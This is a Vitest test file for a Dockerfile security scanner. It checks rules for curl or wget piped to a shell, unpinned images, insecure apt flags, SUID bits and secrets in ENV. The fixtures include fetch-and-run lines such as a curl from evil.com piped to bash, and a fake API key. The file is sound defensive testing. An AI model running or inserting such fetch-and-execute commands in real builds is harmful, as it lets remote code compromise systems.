import { describe, it, expect } from "vitest";
import {
  scanDockerFile,
  isDockerFile,
  isUnpinnedGlobalInstall,
  DOCKERFILE_PATTERNS,
} from "../dockerfile-scanner.js";
import { matchPatternInContent } from "../patterns.js";

function normalizePatternMatches(
  content: string,
  matches: ReturnType<typeof matchPatternInContent>,
) {
  const lineStarts = [0];
  for (let index = 0; index < content.length; index++) {
    if (content[index] === "\n") lineStarts.push(index + 1);
  }

  return matches.map((hit) => {
    const matchIndex = hit.match.index ?? 0;
    const absoluteStart = hit.match.input === content
      ? matchIndex
      : (lineStarts[hit.line - 1] ?? 0) + matchIndex;
    return { line: hit.line, start: absoluteStart, evidence: hit.text };
  });
}

describe("Dockerfile Scanner", () => {
  it("should identify Docker-related filenames", () => {
    expect(isDockerFile("Dockerfile")).toBe(true);
    expect(isDockerFile("Dockerfile.prod")).toBe(true);
    expect(isDockerFile("docker-compose.yml")).toBe(true);
    expect(isDockerFile("docker-compose.yaml")).toBe(true);
    expect(isDockerFile("Containerfile")).toBe(true);
    expect(isDockerFile(".dockerignore")).toBe(true);
    expect(isDockerFile("package.json")).toBe(false);
    expect(isDockerFile("README.md")).toBe(false);
  });

  it("should detect curl piped to bash in Dockerfile", () => {
    const content = 'RUN curl -fsSL https://example.com/install.sh | bash';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(true);
    expect(findings.find((f) => f.rule === "DOCKER_CURL_PIPE")?.severity).toBe("critical");
  });

  it("should detect wget piped to shell", () => {
    const content = 'RUN wget -qO- https://example.com/setup.sh | sh';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(true);
  });

  it("should detect unpinned base images with :latest", () => {
    const content = 'FROM node:latest';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_UNPINNED_BASE")).toBe(true);
  });

  it("should detect FROM without any tag", () => {
    const content = 'FROM ubuntu';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_NO_TAG")).toBe(true);
  });

  it("should not flag pinned images", () => {
    const content = 'FROM node:20-alpine';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_UNPINNED_BASE")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_NO_TAG")).toBe(false);
  });

  it("should detect HTTP ADD source", () => {
    const content = 'ADD https://example.com/file.tar.gz /app/';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_HTTP_SOURCE")).toBe(true);
  });

  it("should detect hardcoded secrets in ENV", () => {
    const content = 'ENV API_KEY=sk-1234567890abcdef';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_SECRETS_BUILD")).toBe(true);
  });

  it("should detect global npm install", () => {
    const content = 'RUN npm install -g some-package';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_NPM_GLOBAL")).toBe(true);
  });

  it("should detect APT no-verify flags", () => {
    const content = 'RUN apt-get install --allow-unauthenticated some-pkg';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(true);
  });

  it("should detect SUID bit setting", () => {
    const content = 'RUN chmod u+s /usr/bin/something';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_SUID")).toBe(true);
  });

  it("should return empty findings for clean Dockerfile", () => {
    const content = [
      "FROM node:20-alpine AS builder",
      "WORKDIR /app",
      "COPY package*.json ./",
      "RUN npm ci --production",
      "COPY . .",
      "EXPOSE 3000",
      'CMD ["node", "index.js"]',
    ].join("\n");
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings).toHaveLength(0);
  });

  it("should include line numbers in findings", () => {
    const content = "FROM node:20\nWORKDIR /app\nRUN curl https://evil.com/x.sh | bash";
    const findings = scanDockerFile(content, "Dockerfile");
    const finding = findings.find((f) => f.rule === "DOCKER_CURL_PIPE");
    expect(finding?.line).toBe(3);
    expect(finding?.file).toBe("Dockerfile");
  });

  it("does not correlate incomplete Docker command fragments", () => {
    const content = [
      "RUN curl https://example.com/install.sh",
      "RUN apt-get install some-pkg",
      "RUN chmod 755 /usr/bin/something",
    ].join("\n");
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_SUID")).toBe(false);
  });

  it("preserves the standalone --force-yes alternative", () => {
    const findings = scanDockerFile("echo --force-yes", "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(true);
  });

  it("does not bridge dot-only correlations across JavaScript line terminators", () => {
    const content = [
      "RUN prefix\rcurl x | bash",
      "RUN prefix\rapt install --allow-unauthenticated",
      "RUN prefix\rchmod u+s /bin/tool",
    ].join("\n");
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_SUID")).toBe(false);
  });

  it("matches the legacy regex verdict on Docker correlation edge cases", () => {
    const cases: Array<[string, string[]]> = [
      ["DOCKER_CURL_PIPE", [
        "RUN curl x | bash",
        "prefix RUN x\rcurl x | bash",
        "prefix RUN x\u2028curl x | bash",
        "prefix RUN x\u2029curl x | bash",
        "RUN curl \r x | SH",
        "RUN curl \u2028 x | python",
        "RUN curl \u2029 x | perl",
        "RUN curl \r x | cat wget y | bash",
        "RUN curl \u2028 x | cat wget y | bash",
        "RUN curl \u2029 x | cat wget y | bash",
        "RUN old RUN \r curl x | bash",
        "RUN old RUN \u2028 curl x | bash",
        "RUN old RUN \u2029 curl x | bash",
        "RUN first RUN second curl x | sh curl y | NODE",
        "before\nRUN curl x | bash",
      ]],
      ["DOCKER_APT_NO_VERIFY", [
        "--force-yes",
        "RUN apt x --allow-unauthenticated",
        "RUN apt x --allow-unauthenticated y --allow-unauthenticated",
        "RUN apt \r x --allow-unauthenticated",
        "RUN apt \u2028 x --allow-unauthenticated",
        "RUN apt \u2029 x --allow-unauthenticated",
        "RUN apt x\r--allow-unauthenticated",
        "RUN apt x\u2028--allow-unauthenticated",
        "RUN apt x\u2029--allow-unauthenticated",
        "RUN apt x RUN \r apt y --allow-unauthenticated",
        "RUN apt x RUN \u2028 apt y --allow-unauthenticated",
        "RUN apt x RUN \u2029 apt y --allow-unauthenticated",
        "--force-yes x RUN apt y --allow-unauthenticated",
        "RUN apt x --force-yes y --allow-unauthenticated",
      ]],
      ["DOCKER_SUID", [
        "RUN chmod u+s /bin/x",
        "RUN x\rchmod u+s /bin/x",
        "RUN x\u2028chmod u+s /bin/x",
        "RUN x\u2029chmod u+s /bin/x",
        "RUN chmod \rno chmod u+s /bin/x",
        "RUN chmod \u2028no chmod u+s /bin/x",
        "RUN chmod \u2029no chmod u+s /bin/x",
        "RUN old RUN \r chmod u+s /bin/x",
        "RUN old RUN \u2028 chmod u+s /bin/x",
        "RUN old RUN \u2029 chmod u+s /bin/x",
        "RUN first RUN second chmod u+s x chmod g+s",
      ]],
      ["DOCKER_NPM_GLOBAL", [
        "RUN npm install -g pnpm",
        "RUN npm install -g pnpm@9.15.0",
        "RUN npm i --global    pnpm",
        "RUN npm add --location=global pnpm@9.15.0",
        "RUN npm \r install -g pnpm",
        "RUN npm install -g \rpnpm",
        "RUN npm install -g pnpm\r",
        "RUN npm install -g \r",
        "RUN npm install -g    ",
        "RUN npm install -g pinned@1.2.3 && RUN npm i -g mutable",
        "RUN npm install -g old\rRUN npm install -g later",
        "prefix\nRUN npm install -g pnpm",
      ]],
    ];

    for (const [rule, sources] of cases) {
      const structural = DOCKERFILE_PATTERNS.find((entry) => entry.rule === rule)!;
      const regex = {
        ...structural,
        correlatedMatcher: undefined,
        valueFilter: rule === "DOCKER_NPM_GLOBAL"
          ? isUnpinnedGlobalInstall
          : structural.valueFilter,
      };
      for (const content of sources) {
        const expected = normalizePatternMatches(
          content,
          matchPatternInContent(regex, content, "i"),
        );
        const actual = normalizePatternMatches(
          content,
          matchPatternInContent(structural, content, "i"),
        );
        expect(actual, `${rule}: ${JSON.stringify(content)}`).toEqual(expected);
      }
    }
  });

  it("fully scans 5 MiB repeated-prefix near misses in linear time", { timeout: 15_000 }, () => {
    const size = 5 * 1024 * 1024;
    const cases: Array<[string, string]> = [
      ["DOCKER_CURL_PIPE", "RUN curl x"],
      ["DOCKER_APT_NO_VERIFY", "RUN apt x"],
      ["DOCKER_SUID", "RUN x"],
    ];
    const started = Date.now();

    for (const [rule, unit] of cases) {
      const pattern = DOCKERFILE_PATTERNS.find((entry) => entry.rule === rule)!;
      const content = unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
      const hits = matchPatternInContent(pattern, content, "i");
      expect(hits, rule).toHaveLength(0);
      expect(hits.coverage.complete, rule).toBe(true);
      expect(hits.coverage.regexAttempts, rule).toBe(1);
    }

    const npmPattern = DOCKERFILE_PATTERNS.find(
      (entry) => entry.rule === "DOCKER_NPM_GLOBAL",
    )!;
    const npmUnit = "RUN npm install -g \r";
    const npmContent = npmUnit.repeat(Math.floor(size / npmUnit.length));
    const npmHits = matchPatternInContent(npmPattern, npmContent, "i");
    expect(npmHits).toHaveLength(0);
    expect(npmHits.coverage.complete).toBe(true);
    expect(npmHits.coverage.regexAttempts).toBe(1);

    expect(Date.now() - started).toBeLessThan(5_000);
  });

  it("should have patterns array", () => {
    expect(DOCKERFILE_PATTERNS.length).toBeGreaterThan(5);
    for (const p of DOCKERFILE_PATTERNS) {
      expect(p.rule).toBeTruthy();
      expect(p.severity).toBeTruthy();
    }
  });
});
